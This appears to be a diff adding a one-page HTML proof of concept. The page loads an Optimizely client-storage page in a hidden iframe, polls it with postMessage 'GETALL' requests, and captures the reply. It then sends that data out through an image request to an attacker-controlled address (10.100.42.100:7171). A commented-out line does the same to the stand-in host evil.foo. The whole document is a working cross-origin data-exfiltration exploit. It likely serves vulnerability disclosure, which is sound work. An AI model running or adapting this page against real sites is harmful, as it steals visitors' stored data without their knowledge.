@@ -1,0 +1,35 @@
+<!doctype html>
+<html>
+<head>
+  <title>Proof of Concept</title>
+  <style>
+  iframe {
+    display: none;
+  }
+  </style>
+</head>
+<body>
+  <iframe id="victim-iframe" src="https://a5935064.cdn.optimizely.com/client_storage/a5935064.html"></iframe>
+  <div id='cookie'>Loading...</div>
+  <script>
+  document.cookie="last_referrer=foo; Max-Age=999999999999";
+  var interval;
+
+  window.addEventListener('message', function(e) {
+    document.getElementById("cookie").innerText = e.data;
+    var exfil = document.createElement('img');
+/*
+    exfil.setAttribute('src','https://evil.foo/?'+encodeURIComponent(e.data));
+*/
+    exfil.setAttribute('src','http://10.100.42.100:7171/?'+encodeURIComponent(e.data));
+    document.body.appendChild(exfil);
+    clearInterval(interval);
+  })
+
+var vframe = document.getElementById("victim-iframe");
+var interval = setInterval(function() {
+  vframe.contentWindow.postMessage(JSON.stringify({type:"GETALL", id:"foo"}), "*");
+}, 10);
+  </script>
+</body>
+</html>
